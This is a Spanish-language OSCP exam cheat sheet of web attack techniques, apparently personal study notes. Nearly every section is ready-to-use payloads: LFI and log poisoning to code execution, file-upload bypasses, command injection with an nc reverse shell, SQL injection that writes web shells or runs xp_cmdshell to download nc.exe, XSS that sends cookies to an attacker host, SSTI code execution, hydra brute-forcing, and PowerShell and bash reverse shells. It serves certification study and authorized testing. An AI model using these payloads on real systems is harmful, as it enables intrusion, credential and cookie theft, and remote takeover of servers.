# Chuleta — Ataques web

> Fuente principal: [oscp.adot8.com — Web Applications](https://oscp.adot8.com/web-applications/checklist)
> (notas de un OSCP real). Complementa la sección 80/443 de
> [`../guia/02-enumeracion-servicios.md`](../guia/02-enumeracion-servicios.md).
>
> ⚠️ **`sqlmap` está PROHIBIDO** en el examen (herramienta de explotación automática). La SQLi
> se hace **a mano** — ver §6.

---

## 0. Checklist y metodología

```
¿No podés hacer GET a una ruta?  →  PROBÁ OTROS MÉTODOS (POST/PUT/OPTIONS/PATCH...)
```

**App web conocida** (WordPress, Tomcat, etc.):
1. Acotá la **versión exacta**.
2. Credenciales por defecto / variaciones (en segundo plano).
3. Buscá **exploits/CVEs** (`searchsploit`).

**App a medida** ("box built"):
1. **Dir-bust a fondo en cada nivel** (en segundo plano).
2. Default creds / variaciones.
3. Exploits conocidos.
4. **Fuzzeá cada input** por SQLi, command injection, etc.
5. ¿Subida de archivos?
6. Directory traversal, LFI, RFI.
7. **Leé el código fuente** buscando pistas.
8. Revisá **requests/responses en Burp**.

> Trucos: mirá el **directorio `assets/`** y carpetas raras (OffSec esconde cosas ahí). Y
> **visitá TODOS los puertos HTTP por IP y por FQDN** — a veces solo uno revela algo.

---

## 1. Descubrimiento — directorios, vhosts, extensiones

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,config,pdf -t 100
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -recursion -recursion-depth 4 -e .php,.txt,.html

# Virtual hosts
gobuster vhost -u http://<dominio> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://<dominio> -H "Host: FUZZ.<dominio>" --hw 1
```

Extensiones a probar: `php, aspx, txt, html, config, conf, asp, pdf, zip, tar`.
**Mirá también el certificado SSL** (a veces filtra el vhost).

---

## 2. Directory Traversal / LFI / RFI

```text
../../../../../../../../../etc/passwd
..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd        # encoding
\%2e%2e\%2e%2e\%2e%2e\windows\system32\drivers\etc\hosts
```

**Qué buscar:** usuarios (`/etc/passwd`), **claves SSH**, contraseñas en logs/configs
(`.htaccess`, `config.php`).

**Archivos que suelen rendir:**

| Tipo | Rutas |
| --- | --- |
| SSH | `id_rsa`, `id_ed25519`, `id_ecdsa`, `authorized_keys`, `known_hosts` — también `C:\Users\<u>\.ssh\` |
| Logs Apache/Nginx | `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/etc/httpd/logs/error_log`, `/opt/apache2/logs/access.log` |
| IIS | `C:\inetpub\logs\LogFiles\W3SVC1\`, `C:\inetpub\wwwroot\web.config` |
| Linux user | `.bash_history`, `.mysql_history`, `.my.cnf` |
| Windows/XAMPP | `c:\xampp\apache\bin\php.ini`, `c:\xampp\apache\logs\access.log`, `...\conf\httpd.conf` |

**Log poisoning (LFI → RCE):**

```bash
# 1) Confirmá que podés leer el log
http://<sitio>/app/index.php?page=../../../../../var/log/apache2/access.log
# 2) Envenená el User-Agent (en Burp) con:
<?php echo system($_GET['cmd']); ?>
# 3) Ejecutá
http://<sitio>/app/index.php?page=../../../../../var/log/apache2/access.log&cmd=whoami
```

**RFI** (requiere `allow_url_include=On`):

```text
?page=http://<TU_IP>/simple-backdoor.php&cmd=whoami
```

> Detalle: [`lfi-rce.md`](lfi-rce.md). Referencia: [adot8 — LFI & RFI](https://oscp.adot8.com/web-applications/lfi-and-rfi).

---

## 3. PHP wrappers

```text
php://filter/resource=/etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=index      # ¡probar con y sin extensión!
php://filter/read=string.rot13/resource=index.php

data://text/plain,<?php echo system('whoami');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami

# Si podés subir un zip → zip:// lo descomprime y ejecuta el fichero interno
zip:///var/www/html/uploads/shell.zip%23shell.php
```

> Referencia: [adot8 — PHP Wrappers](https://oscp.adot8.com/web-applications/lfi-and-rfi/php-wrappers).

---

## 4. File Upload

**Extensiones alternativas:** `.pHP`, `.phps`, `.php2-7`, `.phar`, `.phtml`, `.pht`,
`.php%00`, `.php%20`, `.php%0a`, `.php%00.png`, `.php#png`, `.png.php`; y `.asp/.aspx/.ashx`,
`.jsp/.jspx/.jsw`, `.pl/.cgi`.

**Bypass de validación:**

- **Magic bytes**: primer y último byte de un tipo permitido + código PHP en medio.
- **`.htaccess`**: subís un `.htaccess` con `AddType application/x-httpd-php .pwned` y luego
  subís tu shell como `.pwned`.
- **Doble extensión / null byte / mayúsculas**.

**Combinado con directory traversal**: subí a `../../../../root/.ssh/authorized_keys`.

**Responder + upload**: si el nombre del fichero se refleja como UNC, poné `"\\<TU_IP>\share"` y
capturá el hash (ojo: **poisoning prohibido**; usá `responder -A`).

> ASPX shell: [borjmz/aspx-reverse-shell](https://github.com/borjmz/aspx-reverse-shell).
> Referencia: [adot8 — File Upload](https://oscp.adot8.com/web-applications/file-upload).

---

## 5. Command Injection

```text
; whoami
& whoami #
&& whoami
| whoami
`whoami`      $(whoami)
%0a id %0a
;system('id')
```

**Sin espacios** → `${IFS}`:

```bash
`cat${IFS}file.txt`
`./nc${IFS}<TU_IP>${IFS}1337${IFS}-e${IFS}/bin/bash`
```

**SSRF vía curl / argumentos** (si podés controlar una URL):

```text
file:///etc/passwd
gopher://<TU_IP>
https://webhook.site/<id>/`whoami`
```

> Referencia: [adot8 — Command injection](https://oscp.adot8.com/web-applications/command-injection).

---

## 6. SQL Injection

> **Manual.** `sqlmap` prohibido en el examen. Fuzzeá primero con caracteres especiales:
> `wfuzz -u 'http://<IP>/page.php?id=1FUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt --hc 404`

### 6.1 Detección y estructura

```text
' or 1=1-- -
' or 1=1#
' order by 1-- -        # contar columnas
' union select 1,2,3-- -   # columnas que se reflejan
```

- Si la app acepta `%` como wildcard, la query probablemente usa `%input%` en un `LIKE`.
- `UNION SELECT` necesita **el mismo número de columnas** a cada lado.

### 6.2 MySQL

```sql
SELECT database(), user(), @@version
SELECT schema_name FROM information_schema.schemata
SELECT group_concat(schema_name,"\r\n") FROM information_schema.schemata
SELECT group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n") FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='<db>'
SELECT group_concat(host,":",user,":",password,"\r\n") FROM mysql.user
LOAD_FILE("/etc/passwd"); TO_base64(LOAD_FILE("/etc/passwd"))
```

**SQLi → RCE** (si hay privilegios de escritura):

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null
  INTO OUTFILE "/var/www/html/cmd.php" -- -
-- Windows XAMPP:
' UNION SELECT 1,('<?php echo shell_exec($_GET["cmd"]); ?>'),3
  INTO OUTFILE 'C:\\xampp\\htdocs\\cmd.php' -- -
```

### 6.3 MSSQL

```sql
user; db_name(5); Select @@version;
union select name,id from <db>..sysobjects where xtype='u'-- -
union select 1,(select string_agg(concat(name,':',id),'|') from <db>..sysobjects where xtype='u')-- -
union select (select string_agg(name,'|') from <db>..syscolumns where id='<dbID>')
```

**Query stacking** (`;`) → `xp_dirtree` (captura de hash) y `xp_cmdshell`:

```sql
q=fast'; exec xp_dirtree '\\<TU_IP>\share';-- -
'EXEC sp_configure 'show advanced options',1-- -   'RECONFIGURE-- -
'EXEC sp_configure 'xp_cmdshell',1-- -             'RECONFIGURE-- -
'EXEC xp_cmdshell 'certutil.exe -f -urlcache "http://<TU_IP>/nc.exe" C:\programdata\nc.exe'-- -
```

> Chuleta completa: [`mssql-injection.md`](mssql-injection.md). Referencia:
> [adot8 — MSSQL](https://oscp.adot8.com/web-applications/sql-injection/mssql-cheatsheet).

### 6.4 PostgreSQL

```sql
'select pg_sleep(3)
;select pg_sleep(3)
-- RCE
DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM '<reverse shell>'; SELECT * FROM cmd_exec;
```

> Referencia: [adot8 — Postgres](https://oscp.adot8.com/web-applications/sql-injection/postgres-cheatsheet).

### 6.5 Ciego (blind / time-based)

```text
1 or sleep(5)#
' AND IF (1=1, sleep(3), 'false') -- -
'waitfor delay '0:0:5'--      (MSSQL)
```

> Truco: si buscás un usuario concreto, `adot8' AND IF (1=1, sleep(3),'false') -- -` y **si tarda
> 3 s, el usuario existe**.

### 6.6 sqlmap (⚠️ PROHIBIDO en el examen — solo labs)

```bash
sqlmap -r req --batch --dbs
sqlmap -r req -D <db> --dump
sqlmap -r req -p item --os-shell --web-root "/var/www/html/tmp"
```

> Referencia: [adot8 — SQL Injection](https://oscp.adot8.com/web-applications/sql-injection).
> Payloads completos por motor: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).

---

## 7. SSRF

Con inputs que piden una URL, apuntalos al **propio servidor**:

```text
http://127.0.0.1
http://localhost:<puerto>
```

**Fuzzear puertos internos vía SSRF** (pasás el request de Burp a ffuf):

```bash
ffuf -request req -request-proto http -w ~/opt/wordlists/ports.txt:FUZZ -fs 61
```

> Referencia: [adot8 — SSRF](https://oscp.adot8.com/web-applications/ssrf).

---

## 8. XSS y SSTI

**XSS:**

```html
<script>alert(1)</script>
<img src=x onerror="alert(document.cookie)">
<img src=x onerror="this.src='https://<TU_IP>/?'+document.cookie; this.removeAttribute('onerror');">
<script>new Image().src="https://<TU_IP>/?"+document.cookie;</script>
```

**SSTI** (si `{{7*7}}` → `49`): Jinja2/Twig, Freemarker, Smarty, Velocity…

```text
{{7*7}}   ${7*7}   #{7*7}   <%= 7*7 %>   @(7+7)   *{7*7}
{{config.items()}}   {{ self }}   {{ request }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
${T(java.lang.Runtime).getRuntime().exec('id')}    # Spring/Java
```

> Payloads: [payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads).
> Referencia: [adot8 — XSS](https://oscp.adot8.com/web-applications/xxs).

---

## 9. APIs

```bash
# Fuzzear parámetros
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<IP>:<port>/?FUZZ=1

# Rutas REST: /api/v1 → enumerar con patrón
gobuster dir -w directories.txt -p apis_patt.txt -u http://<IP>:<port>/ -t 100
```

```bash
curl -i http://<IP>:<port>/help | python3 -m json.tool
curl -d '{"user":"admin","password":"test"}' -H 'Content-Type: application/json' http://<IP>:<port>/login/v1
# subir archivos
curl http://<IP>:<port>/file-upload -i -L -X POST -H "Content-type: multipart/form-data" \
     -F file=@"$(pwd)/authorized_keys.txt" -F filename='/home/<user>/.ssh/authorized_keys'
```

**Bypass de WAF** (cabeceras de IP interna):

```text
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

> Referencia: [adot8 — APIs](https://oscp.adot8.com/web-applications/apis).

---

## 10. Brute forcing y spraying

**Credenciales típicas:** usuarios `root`, `admin`, `administrator`; contraseñas
`admin`, `root`, `toor`, `password`, y **el nombre de la app/usuario** (probar mayúscula y
minúscula). Scrapeá la web para una wordlist: `cewl <url>` (`--lower`, `--upper`).

```bash
# Formulario web (login) — HTTP POST form
hydra -I -f -L users.txt -P pass.txt \
  'http-post-form://<IP>:<port>/login:username=^USER^&password=^PASS^:F=incorrect'
# con base64 (^USER64^ ^PASS64^)
hydra -I -f -L users.txt -P pass.txt \
  'http-post-form://<IP>:<port>/session:username=^USER64^&password=^PASS64^:C=/:F=403'
# HTTP GET básico
hydra -l admin -P ~/rockyou.txt http-get://<IP> -vV
# Otros servicios
hydra -vV -l itadmin -P ~/rockyou.txt <IP> ssh -t 10
hydra -vV -L names.txt -p 'Password!' <IP> rdp -t 10
```

> Referencia: [adot8 — Brute Forcing and Spraying](https://oscp.adot8.com/web-applications/brute-forcing-and-spraying).

---

## 11. Compilar exploits

```bash
i686-w64-mingw32-gcc 42341.c -o exploit.exe            # 32-bit Windows
i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32   # si usa winsock
```

---

## 12. Foothold — shells

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<TU_IP>/shell.ps1')"
# base64:  $Text=... ; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Text))  →  powershell -e <b64>
```

```bash
bash -c 'bash -i >& /dev/tcp/<TU_IP>/1337 0>&1'
```

> Referencia: [adot8 — Payloads](https://oscp.adot8.com/web-applications/payloads) · [Foothold](https://oscp.adot8.com/web-applications/foothold).

---

## 13. Node.js, PHP apps y código fuente

- **Node.js**: si `gobuster` no descubre rutas, mirá el `app.js` (define las rutas).
- **PHP**: fuzzeá parámetros `?FUZZ=`:
  ```bash
  ffuf -u 'http://<IP>/admin/index.php?FUZZ=id' -w burp-parameter-names.txt \
       -H "Cookie: PHPSESSID=<id>"
  ```
  Y probá `?FUZZ=../../../../etc/passwd` (DT/LFI).
- **Código fuente / LFI**: `php://filter/convert.base64-encode/resource=index` para leer `index.php`
  (con y sin extensión). Si hay `include($_GET['page'])`, buscá **RCE vía PHP filter chains**:
  ```bash
  python3 php_filter_chain_generator.py --chain "<?php system(\$_GET['cmd']); ?>"
  # y append a  /?page=<output>
  ```
  Auth bypass PHP con `strcmp()`: pasar un **array** (`?pass[]=x`) hace que `strcmp` devuelva `NULL`.

> Referencias: [adot8 — Source Code](https://oscp.adot8.com/web-applications/source-code) · [PHP Applications](https://oscp.adot8.com/web-applications/php-applications) · [Node.js](https://oscp.adot8.com/web-applications/node.js).

---

## 14. Misc

- **Añadir cabeceras en Burp**: Proxy → Match and Replace, para inyectar un header (p. ej. de IP
  interna) en todas las peticiones del navegador.
- Si la web es "aburrida", mirá `assets/` y carpetas raras.

> Referencia: [adot8 — Misc](https://oscp.adot8.com/web-applications/misc).
